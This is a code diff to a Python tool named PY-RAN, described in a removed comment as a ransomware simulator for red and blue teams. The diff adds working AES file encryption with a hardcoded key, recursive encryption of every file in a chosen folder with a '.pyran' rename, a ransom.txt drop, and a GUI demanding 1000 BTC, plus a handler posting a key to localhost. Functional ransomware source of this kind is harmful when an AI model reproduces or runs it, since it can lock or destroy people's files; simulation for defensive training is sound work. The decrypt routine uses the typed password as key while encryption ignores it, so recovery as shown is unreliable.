@@ -11,6 +11,8 @@ import string
 import PySimpleGUI as sg
 import requests
 import pgpy
+from Cryptodome.Cipher import AES
+from Cryptodome.Random import get_random_bytes
 parser = argparse.ArgumentParser()
 parser.add_argument("--dir",help="Location of the Folder you want to simulate")
 parser.add_argument("--mode",help="Accepts encrypt or decrypt arguments.")
@@ -26,22 +28,35 @@ def DecryptFile(file,password):
     pyAesCrypt.decryptFile(file, file.split(".pyran")[0], password, bufferSize)
     os.remove(file)
 
-# welcome = '''
-# .______   ____    ____      .______          ___      .__   __. 
-# |   _  \  \   \  /   /      |   _  \        /   \     |  \ |  | 
-# |  |_)  |  \   \/   / ______|  |_)  |      /  ^  \    |   \|  |
-# |   ___/    \_    _/ |______|      /      /  /_\  \   |  . `  | 
-# |  |          |  |          |  |\  \----./  _____  \  |  |\   | 
-# | _|          |__|          | _| `._____/__/     \__\ |__| \__|
+def fast_encrypt(infile, pw):
+    with open(infile, 'rb') as file_data:
+        key = bytes('warm2daywarm2day', 'utf-8')
+        # print(str(key))
+        cipher = AES.new(key, AES.MODE_EAX)
+        ciphertext, tag = cipher.encrypt_and_digest(file_data.read())
+    with open(infile, 'wb') as file_out:
+        [ file_out.write(x) for x in (cipher.nonce, tag, ciphertext) ]
+    os.rename(infile, infile + '.pyran')
 
-# ** PY-RAN is a Ransomware Simulator for Red/Blue Teams to simulate a ransomware.
-# ** C0ded by zer0_p1k4chu
-# ** use -h for help
-# '''
-# print(welcome)
+def fast_decrypt(infile, pw):
+    key = bytes(pw, 'utf-8')
+    with open(infile, 'rb') as file_data:
+        nonce, tag, ciphertext = [ file_data.read(x) for x in (16, 16, -1) ]
+        cipher = AES.new(key, AES.MODE_EAX, nonce)
+        data = cipher.decrypt_and_verify(ciphertext, tag)
+    with open(infile, 'wb') as outfile:
+        outfile.write(data)
+    newname = infile.split(".pyran")[0]
+    os.rename(infile, newname)
+
+
 def encrypt_data(password, dire='../azure_blob_analytics/'):
     for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(dire)] for val in sublist]:
-        EncryptFile(file,password)
+        # EncryptFile(file,password)
+        try:
+            fast_encrypt(file, password)
+        except PermissionError:
+            continue
     print("Encryption Done!")
     f = open("ransom.txt","w+")
     f.write("PY-RAN ransomware simulated successfully encrypted the files.")
@@ -50,7 +65,7 @@ def encrypt_data(password, dire='../azure_blob_analytics/'):
 def decrypt_data(password, dire='../azure_blob_analytics/'):
     for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(dire)] for val in sublist]:
         try:
-            DecryptFile(file,password)
+            fast_decrypt(file,password)
         except ValueError:
             # .DS_STORE file
             continue
@@ -113,13 +128,14 @@ WSBCTE9DSy0tLS0tCg=="""
 
 
 if __name__ == '__main__':
-    encrypt_data("Warm2Day", "./test/")
+    # fast_encrypt("./test/test.txt", "Warm2Day")
+    # fast_decrypt()
     # Define the window's contents
     layout = [[sg.Text("Your files have been encrypted. ")],
             [sg.Text("Pay 1000BTC to recieve decryption key.")],
-            # [sg.T("")], [sg.Text("Choose a folder: "), sg.Input(key="-DIR-" ,change_submits=True), sg.FolderBrowse(key="-DIR-")],[sg.Button("Submit")],
-            # [sg.Text("Enter Encryption Key...")],
-            # [sg.Input(key='-EINPUT-')],
+            [sg.T("")], [sg.Text("Choose a folder: "), sg.Input(key="-DIR-" ,change_submits=True), sg.FolderBrowse(key="-DIR-")],[sg.Button("Submit")],
+            [sg.Text("Enter Encryption Key...")],
+            [sg.Input(key='-EINPUT-')],
             [sg.Text("Enter Decryption Key...")],
             [sg.Input(key='-DINPUT-')],
             [sg.Text(size=(40,1), key='-OUTPUT-')],
@@ -139,12 +155,13 @@ if __name__ == '__main__':
         
         if event == 'Decrypt Files':
             window['-OUTPUT-'].update('Decrypting files with key: ' + values['-DINPUT-'] + ". . .")
-            # decrypt_data(values['-DINPUT-'], values['-DIR-'])
-            decrypt_data(values['-DINPUT-'], './test/')
+            decrypt_data(values['-DINPUT-'], values['-DIR-'])
+            # decrypt_data(values['-DINPUT-'], './test/')
+            # fast_decrypt('./test/test.txt.pyran', values['-DINPUT-'])
 
-        # elif event == 'Encrypt':
-        #     window['-OUTPUT-'].update('Encrypting files with key: ' + values['-EINPUT-'] + ". . .")
-        #     encrypt_data(values['-EINPUT-'], values['-DIR-'])
+        elif event == 'Encrypt':
+            window['-OUTPUT-'].update('Encrypting files with key: ' + values['-EINPUT-'] + ". . .")
+            encrypt_data(values['-EINPUT-'], values['-DIR-'])
         elif event == 'Send a Post':
             url = 'http://localhost:8080'
             key = generate_encryption_key(25)
